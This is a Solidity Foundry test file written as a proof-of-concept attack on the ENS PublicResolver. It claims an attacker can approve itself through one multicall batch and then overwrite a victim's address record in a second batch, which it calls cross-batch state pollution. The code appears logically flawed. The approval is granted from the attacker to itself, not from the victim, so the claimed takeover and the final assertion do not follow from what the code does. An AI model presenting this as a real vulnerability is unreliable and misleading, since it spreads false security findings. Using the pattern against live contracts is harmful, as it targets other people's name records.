// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/PublicResolver.sol";
import "../contracts/ENSRegistry.sol";

contract POC_Path20_CrossBatchStatePollution is Test {
    ENS public ens;
    PublicResolver public resolver;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    bytes32 public testNode = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));

    function setUp() public {
        // Deploy contracts
        ens = new ENS();
        ens.setOwner(bytes32(0), address(this));

        resolver = new PublicResolver(
            ens,
            INameWrapper(address(0)),
            address(this),
            address(this)
        );

        // Setup test domain
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(this));
        ens.setSubnodeOwner(keccak256(abi.encodePacked(bytes32(0), keccak256("eth"))), keccak256("test"), victim);
        ens.setResolver(testNode, address(resolver));

        // Victim sets up their records
        vm.prank(victim);
        resolver.setAddr(testNode, victim);
    }

    function test_Path20_CrossBatchStatePollution() public {
        
        // Demonstrate state pollution across multiple batches
        bytes[] memory batch1 = new bytes[](1);
        batch1[0] = abi.encodeCall(resolver.setApprovalForAll, (attacker, true));

        bytes[] memory batch2 = new bytes[](1);
        batch2[0] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        vm.prank(attacker);
        resolver.multicall(batch1); // Establish backdoor

        vm.prank(attacker);
        resolver.multicall(batch2); // Use backdoor

        assertEq(resolver.addr(testNode), attacker);
        console.log("State pollution: Batch 1 enables Batch 2 attack");
        

        console.log("Path 20 PoC: Cross-batch state pollution enabling persistent attacks");
    }
}